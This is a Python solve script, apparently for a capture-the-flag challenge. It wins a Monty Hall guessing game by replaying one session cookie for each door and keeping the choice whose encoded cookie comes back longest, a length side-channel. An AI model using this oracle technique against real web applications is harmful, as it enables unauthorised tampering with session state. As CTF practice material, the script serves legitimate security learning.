import requests
import base64

url = "http://monty-hall.challs.olicyber.it/"

r = requests.get(url)
cookie = r.cookies.get_dict()

def decoded_len(c):
    return len(base64.b64decode(c["session"]))

ris = []

for i in range(11):
    original_cookie = dict(cookie)
    best_len = 0
    best_cookie = None
    best_porta = None

    for porta in range(3):
        payload = {"choice": f"{porta+1}"}
        r = requests.post(url, cookies=original_cookie, data=payload, allow_redirects=False)
        tmp_cookie = r.cookies.get_dict()
        tmp_l = decoded_len(tmp_cookie)
        print(f"Round {i+1}, porta {porta+1}: len={tmp_l}")

        if tmp_l > best_len:
            best_len = tmp_l
            best_cookie = tmp_cookie
            best_porta = porta + 1

    cookie = best_cookie
    ris.append(best_porta)
    print(f"  ✓ Porta scelta: {best_porta}\n")

print(ris)

r = requests.get(url, cookies=cookie)
print(r.text)